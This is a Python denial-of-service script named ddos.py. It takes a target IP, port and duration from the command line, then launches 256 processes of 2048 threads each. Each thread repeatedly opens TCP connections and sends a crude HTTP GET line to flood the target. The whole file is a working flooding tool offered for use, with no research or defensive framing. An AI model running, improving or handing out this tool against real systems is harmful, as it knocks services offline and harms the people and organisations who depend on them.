# ddos.py (TCP)
# Import necessary packages
import socket
import multiprocessing
import threading
import time
import sys

# Function to send TCP packets to the target for a specified duration
def send_packet(target, port, duration):
    start_time = time.time()

    # Worker function to send packets in a loop until the specified duration
    def worker():
        while time.time() - start_time < duration * 60:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.close()

    threads = []

    # Create and start multiple threads to send packets concurrently
    for _ in range(2048):  # You can adjust the number of threads based on your system's capabilities
        thread = threading.Thread(target=worker)
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # Check if the correct number of command-line arguments is provided
    if len(sys.argv) != 4:
        print("Usage: python script.py <target_ip> <port> <time in minutes>")
        sys.exit(1)

    # Parse command-line arguments
    target = sys.argv[1]
    port = int(sys.argv[2])
    duration_in_minutes = float(sys.argv[3])

    processes = []

    # Create and start multiple processes to send packets concurrently
    for _ in range(256):  # You can adjust the number of processes based on your system's capabilities
        process = multiprocessing.Process(target=send_packet, args=(target, port, duration_in_minutes))
        processes.append(process)
        process.start()

    # Wait for all processes to finish
    for process in processes:
        process.join()
